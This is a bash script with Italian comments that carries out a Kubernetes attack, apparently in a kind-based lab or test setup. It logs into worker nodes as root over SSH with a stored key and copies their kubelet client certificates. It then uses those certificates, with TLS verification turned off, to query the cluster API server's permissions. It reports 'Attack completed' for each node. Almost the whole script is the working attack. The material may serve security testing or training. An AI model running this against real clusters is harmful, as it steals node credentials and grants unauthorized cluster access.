#!/usr/bin/env bash
set -euo pipefail

FILE_IP="$DATA_PATH/KC5/iphost"
KEY_PATH="$DATA_PATH/KC5/ssh/ssh-key"

list_node_hostnames() {
  if [[ ! -f "$FILE_IP" ]]; then
    echo "Errore: file '$FILE_IP' non trovato" >&2
    return 1
  fi

  echo ">> Recupero lista IPs (da file: $FILE_IP)..." >&2

  # raccogliamo e stampiamo alla fine per poter fare sort -u
  grep -E '[-]' "$FILE_IP" \
   | cut -d'-' -f2- \
   | sed -E 's/^[[:space:]]+|[[:space:]\r]+$//g' \
   | grep worker \
   | cut -d'.' -f1 \
   | sort -u
}

# Installo kubectl
curl -fsSLo /usr/local/bin/kubectl https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl && \
    chmod +x /usr/local/bin/kubectl

mapfile -t nodes < <(list_node_hostnames | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "Nessun nodo trovato."; exit 1
fi
echo ">> Nodi trovati (${#nodes[@]}): ${nodes[*]}"
DIR_REMOTE="/host/var/lib/kubelet/pki"

for n in "${nodes[@]}"; do
  CERT_PATH="$DATA_PATH/KC5/cert_node/kubelet-client-current-$n.pem"
  mkdir -p "$(dirname "$CERT_PATH")"

  ssh -p 2222 -o StrictHostKeyChecking=accept-new \
    -i "$KEY_PATH" "root@$n" 'sh -s --' "$DIR_REMOTE" > "$CERT_PATH" <<'REMOTE'
set -eu
dir="${1:-/host/var/lib/kubelet/pki}"
# prima prova: file datati (esclude *current*)
f=$(find "$dir" -maxdepth 1 -type f -name 'kubelet-client-*' ! -name '*current*' -print 2>/dev/null | sort | head -n1 || true)
# se non trovato, accetta qualunque kubelet-client-*
[ -z "$f" ] && f=$(find "$dir" -maxdepth 1 -type f -name 'kubelet-client-*' -print 2>/dev/null | sort | head -n1 || true)
if [ -n "$f" ]; then
  cat "$f"
fi
REMOTE
    kubectl --server="https://kind-cluster-control-plane:6443" \
      --insecure-skip-tls-verify=true \
      --client-certificate="$CERT_PATH" \
      --client-key="$CERT_PATH" auth can-i --list
    echo "Attack completed for $n"
done
